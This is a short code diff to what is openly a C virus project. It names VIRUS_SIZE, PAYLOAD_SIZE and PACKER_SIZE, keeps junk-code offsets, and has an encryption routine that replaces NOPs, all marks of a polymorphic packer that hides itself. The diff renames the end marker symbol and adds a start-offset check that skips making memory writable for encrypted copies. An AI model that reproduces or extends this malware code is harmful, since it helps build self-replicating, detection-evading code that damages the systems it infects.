@@ -10,14 +10,15 @@
 #include "syscall.h"
 
 extern void __attribute__((naked)) _start(void);
-extern void end(void);
+extern void real_end(void);
 extern bool g_is_encrypted;
+extern int g_start_offset;
 //extern int64_t g_key;
 extern uint8_t g_key[KEY_SIZE];
 extern void real_start(void);
 
-#define VIRUS_SIZE (uintptr_t)&end - (uintptr_t)&_start
-#define PAYLOAD_SIZE (uintptr_t)&end - (uintptr_t)&real_start
+#define VIRUS_SIZE (uintptr_t)&real_end - (uintptr_t)&_start
+#define PAYLOAD_SIZE (uintptr_t)&real_end - (uintptr_t)&real_start
 #define PACKER_SIZE (uintptr_t)&real_start - (uintptr_t)&_start
 
 int __attribute__((section(".text#"))) g_junk_offsets[NB_JUNK_MAX] = {0};
@@ -299,6 +300,11 @@ static void replace_nop_encrypt(uint8_t *self, int *junk_offsets, uint8_t *key) 
 }
 
 int make_writeable(uint8_t *self, size_t size) {
+
+	if (g_start_offset == 0x1000 && g_is_encrypted == true) {
+		return 0;
+	}
+
 	uintptr_t start = (uintptr_t)self;
 	uintptr_t end = start + size; JUNK;
 
